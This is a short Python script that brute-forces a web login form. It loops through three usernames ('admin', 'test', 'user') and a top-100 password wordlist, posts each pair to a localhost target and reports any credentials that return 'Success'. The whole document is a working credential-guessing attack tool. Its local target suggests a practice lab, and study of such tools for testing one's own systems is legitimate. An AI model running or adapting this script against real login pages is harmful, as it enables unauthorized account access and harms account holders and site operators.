import requests
import sys

target = "http://127.0.0.1:5000"
usernames = ["admin", "test", "user"]   
passwords = "top-100.txt"
needle = "Success"

for username in usernames:
    with open(passwords, 'r') as passwords_list:
        for password in passwords_list:
            password = password.strip("\n").encode()
            sys.stdout.write("[X] Attempting user:password -> {}:{}\r".format(username, password.decode())) #\r is a carriage return
            sys.stdout.flush() # flush the buffer after each write
            r = requests.post(target, data={"username": username, "password": password})
            if needle.encode() in r.content:
                sys.stdout.write("\n")
                sys.stdout.write("\t[+] Found valid credentials: {}:{}".format(username, password.decode()))
                sys.exit()
        sys.stdout.flush()
        sys.stdout.write("\n")
        sys.stdout.write("\t[-] No valid credentials found for user: {}".format(username))
        sys.stdout.write("\n")